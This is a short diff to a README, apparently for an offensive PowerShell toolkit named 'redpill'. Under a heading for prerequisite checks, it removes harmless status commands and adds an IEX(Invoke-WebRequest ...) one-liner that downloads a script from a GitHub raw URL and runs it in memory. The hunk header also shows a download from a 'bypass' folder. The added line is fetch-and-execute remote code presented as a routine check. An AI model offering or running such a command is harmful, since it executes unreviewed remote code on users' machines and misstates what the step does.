@@ -13,8 +13,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/PSs
 
 **prerequesites checks:**
 ```powershell
-Get-ExecutionPolicy -List
-Get-Service -Name LanManServer
+(IEX(Invoke-WebRequest -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/CertSign_PS1/auxiliary.ps1"))
 ```
 
 ```powershell
